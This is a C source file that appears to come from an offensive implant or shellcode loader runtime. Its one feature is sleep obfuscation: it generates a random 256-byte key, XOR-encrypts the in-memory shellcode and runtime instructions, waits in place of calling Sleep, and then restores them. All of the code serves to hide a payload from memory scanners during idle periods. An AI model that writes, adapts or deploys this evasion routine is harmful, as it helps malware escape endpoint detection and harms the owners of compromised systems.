#include "c_types.h"
#include "random.h"
#include "shield.h"

#define XOR_KEY_SIZE 256

void xorInst(Shield_Ctx* ctx, byte* key);

__declspec(noinline)
bool DefenseRT(Shield_Ctx* ctx)
{
    // generate random key
    byte key[XOR_KEY_SIZE];
    RandBuf(&key[0], XOR_KEY_SIZE);
    // hide runtime(or with shellcode) instructions
    xorInst(ctx, &key[0]);
    // simulate kernel32.Sleep()
    bool success = ctx->WaitForSingleObject(ctx->hProcess, ctx->milliseconds);
    // recover runtime(or with shellcode) instructions
    xorInst(ctx, &key[0]);
    return success;
}

void xorInst(Shield_Ctx* ctx, byte* key)
{
    // calculate shellcode position
    uintptr beginAddr = ctx->InstAddress;
    uintptr endAddr   = (uintptr)(&DefenseRT);
    // hide runtime(or with shellcode) instructions
    uint keyIdx = 0;
    for (uintptr addr = beginAddr; addr < endAddr; addr++)
    {
        byte* data = (byte*)addr;
        byte k = *(byte*)(key + keyIdx);
        *data ^= k;
        // update key index
        keyIdx++;
        if (keyIdx >= XOR_KEY_SIZE)
        {
            keyIdx = 0;
        }
    }
}
